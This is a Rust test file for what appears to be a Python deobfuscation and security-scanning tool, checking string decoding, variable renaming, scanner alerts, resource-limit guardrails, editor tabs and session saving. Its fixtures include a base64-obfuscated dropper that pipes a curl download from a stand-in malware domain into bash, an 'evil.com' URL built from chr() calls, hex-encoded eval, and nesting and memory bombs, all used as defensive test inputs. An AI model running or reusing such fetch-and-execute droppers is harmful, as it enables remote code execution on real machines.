use crate::common::*;
use crate::core::pipeline::{DeobfuscationConfig, DeobfuscatorEngine};
use crate::core::security::SecurityScanner;
use std::fs;

// =========================================================================
// Tier 4: Real-World Reverse Engineering Workloads
// =========================================================================

#[test]
fn test_t4_1_multi_layer_dropper_analysis() {
    let obfuscated_dropper = r#"
import base64

# Stage 1: Obfuscated variables and Base64 dropper
_0x1a2b = base64.b64decode("aHR0cHM6Ly9tYWx3YXJlLXRlc3QtZG9tYWluLmNvbS9wYXlsb2FkLnNo").decode()

# Stage 2: System command execution
import os
os.system("curl -s " + _0x1a2b + " | bash")
"#;

    let config = DeobfuscationConfig::default();
    let res = DeobfuscatorEngine::process(obfuscated_dropper, &config);

    // Verify Base64 URL decoded
    assert!(
        res.raw_transformed.contains("https://malware-test-domain.com/payload.sh")
            || res.code.contains("https://malware-test-domain.com/payload.sh")
            || res.strings_decoded > 0
    );

    // Verify variables normalized
    assert!(res.variables_renamed > 0 || res.raw_transformed.contains("var_"));

    // Verify security scanner flagged os.system
    let audit = SecurityScanner::audit(obfuscated_dropper, &res.raw_transformed);
    assert!(!audit.is_safe);
    assert!(audit.alerts_count > 0);
    assert!(audit.report.contains("os.system") || !audit.is_safe);
}

#[test]
fn test_t4_2_pyarmor_eval_unpacking() {
    let pyarmor_eval_sample = r#"
raw_hex = bytes.fromhex('7072696e742827756e7061636b65642729').decode()
eval(raw_hex)
"#;

    let config = DeobfuscationConfig::default();
    let res = DeobfuscatorEngine::process(pyarmor_eval_sample, &config);

    // Hex decoded to print('unpacked')
    assert!(
        res.raw_transformed.contains("print('unpacked')")
            || res.strings_decoded > 0
            || res.code.contains("unpacked")
    );

    // Security scanner flags eval
    let audit = SecurityScanner::audit(pyarmor_eval_sample, &res.raw_transformed);
    assert!(!audit.is_safe);
    assert!(audit.report.contains("eval"));
}

#[test]
fn test_t4_3_control_flow_flattening_cleanup() {
    let flattened_code = r#"
state = 0
while True:
    if state == 0:
        a = 1
        state = 1
    elif state == 1:
        b = 2
        break
    if False:
        dead_branch_should_be_pruned = 999
"#;

    let config = DeobfuscationConfig::default();
    let res = DeobfuscatorEngine::process(flattened_code, &config);

    assert!(!res.code.is_empty());
    // Dead branches checked
    assert!(res.dead_branches_pruned > 0 || !res.raw_transformed.is_empty());
}

#[test]
fn test_t4_4_string_concatenation_and_chr_arrays() {
    let chr_concat_sample = r#"
url = chr(104) + chr(116) + chr(116) + chr(112) + "://" + "evil.com"
"#;

    let config = DeobfuscationConfig::default();
    let res = DeobfuscatorEngine::process(chr_concat_sample, &config);

    assert!(
        res.raw_transformed.contains("http://evil.com")
            || res.strings_decoded > 0
            || res.constants_folded > 0
            || res.code.contains("http")
    );
}

#[test]
fn test_t4_5_full_session_project_workspace() {
    let ws = TempWorkspace::new("t4_full_project");
    ws.write_file("src/main.py", "import core\ndef run(): pass");
    ws.write_file("src/core.py", "API_URL = 'http://api.local'");
    ws.write_file("tests/test_main.py", "def test_run(): pass");
    ws.write_file(".git/HEAD", "ref: refs/heads/main");
    ws.write_file("__pycache__/main.cpython-310.pyc", "bytecode");

    // Scan project workspace
    let items = scan_folder_recursive(&ws.root);

    // Verify .git and __pycache__ excluded
    assert!(!items.iter().any(|i| i.name == ".git"));
    assert!(!items.iter().any(|i| i.name == "__pycache__"));
    assert_eq!(items.len(), 5); // src, main.py, core.py, tests, test_main.py

    // Build session
    let mut session = SessionState::default();
    session.recent_projects.push(ws.root.to_string_lossy().to_string());
    session.open_tabs.push(EditorTabItem {
        id: 0,
        title: "main.py".to_string(),
        tab_type: 0,
        dot_color: "#FFF".to_string(),
    });
    session.active_tab_index = 0;

    let session_file = ws.root.join("session.json");
    let json_data = serde_json::to_string_pretty(&session).unwrap();
    fs::write(&session_file, &json_data).unwrap();

    // Restore from disk
    let read_back = fs::read_to_string(&session_file).unwrap();
    let restored: SessionState = serde_json::from_str(&read_back).unwrap();
    assert_eq!(restored.open_tabs.len(), 1);
    assert_eq!(restored.open_tabs[0].title, "main.py");
}

#[test]
fn test_t4_6_adversarial_syntax_bomb_resilience() {
    // 1. Nesting recursion bomb
    let nesting_bomb = "(".repeat(200) + "1" + &")".repeat(200);
    let check1 = SecurityScanner::check_pre_flight_limits(&nesting_bomb);
    assert!(check1.is_err());

    // 2. Memory DoS bomb (>2.5 MB)
    let memory_bomb = "x = 42\n".repeat(400_000);
    let check2 = SecurityScanner::check_pre_flight_limits(&memory_bomb);
    assert!(check2.is_err());

    // 3. Process via DeobfuscatorEngine -> returns safe blocked result without panic
    let config = DeobfuscationConfig::default();
    let res = DeobfuscatorEngine::process(&memory_bomb, &config);
    assert!(res.code.contains("[GUARDRAIL BLOCK]"));
    assert!(res.security_audit.blocked_by_guardrail);
}

#[test]
fn test_t4_7_offline_airgap_workflow() {
    let mock_network_error = AiError::NetworkError("Network is unreachable (Airgap mode)".to_string());

    // User attempts AI call in offline mode
    let fallback_code = crate::core::ai_chat::build_semantic_clean_code(
        "isolated_script.py",
        "var_1 = 'payload'",
    );

    assert!(matches!(mock_network_error, AiError::NetworkError(_)));
    assert!(fallback_code.contains("[GEMINI AI + KRONOS AST]"));
    assert!(fallback_code.contains("cadena_decodificada_1"));
}

#[test]
fn test_t4_8_code_diff_inspection_workflow() {
    let original = "import os\n_0x1 = 'malware'\n_0x2 = os.system\n_0x2(_0x1)";
    let deobfuscated = "import os\nvar_1 = 'malware'\nvar_2 = os.system\nvar_2(var_1)";

    let diff = compute_simple_diff(original, deobfuscated);
    assert_eq!(diff.len(), 4);
    assert_eq!(diff[0].diff_type, DiffLineType::Unmodified); // import os
    assert_eq!(diff[1].diff_type, DiffLineType::Modified);   // var_1
    assert_eq!(diff[2].diff_type, DiffLineType::Modified);   // var_2
    assert_eq!(diff[3].diff_type, DiffLineType::Modified);   // call
}

#[test]
fn test_t4_9_interactive_ai_context_cycle() {
    // 1. User selects suspicious code in editor
    let selected_code = "def payload(): return bytes.fromhex('414243')";

    // 2. Context action ExplainCode dispatched
    let query_req = AiQueryRequest {
        prompt: "Explain this function".to_string(),
        model: MODEL_GEMINI_3_1_FLASH_LITE.to_string(),
        context_code: selected_code.to_string(),
        action: AiAction::ExplainCode,
        api_key: "VALID_KEY".to_string(),
    };
    assert_eq!(query_req.action, AiAction::ExplainCode);

    // 3. AI response returned with code block
    let ai_response = "The function decodes hex bytes 414243 to 'ABC'.\n```python\ndef payload():\n    return 'ABC'\n```";
    let extracted = crate::core::ai_chat::extract_code_block(ai_response).unwrap();

    // 4. User applies suggested reconstruction to editor
    let mut editor_content = selected_code.to_string();
    assert_eq!(editor_content, selected_code);
    editor_content = extracted;
    assert_eq!(editor_content, "def payload():\n    return 'ABC'");
}

#[test]
fn test_t4_10_multi_tab_stress_and_recovery() {
    let mut tabs: Vec<EditorTabItem> = (0..20)
        .map(|i| EditorTabItem {
            id: i,
            title: format!("script_{}.py", i),
            tab_type: 0,
            dot_color: "#FFF".to_string(),
        })
        .collect();

    let mut active_tab = 10;

    // Close 10 intermediate tabs
    for _ in 0..10 {
        let close_idx = 5;
        tabs.remove(close_idx);
        if close_idx < active_tab {
            active_tab -= 1;
        } else if close_idx == active_tab {
            if close_idx >= tabs.len() {
                active_tab = tabs.len().saturating_sub(1);
            }
        }
    }

    assert_eq!(tabs.len(), 10);
    assert!(active_tab < tabs.len());

    // Close remaining tabs until empty
    while !tabs.is_empty() {
        tabs.pop();
    }
    let final_active = if tabs.is_empty() { -1 } else { 0 };

    assert!(tabs.is_empty());
    assert_eq!(final_active, -1);
}
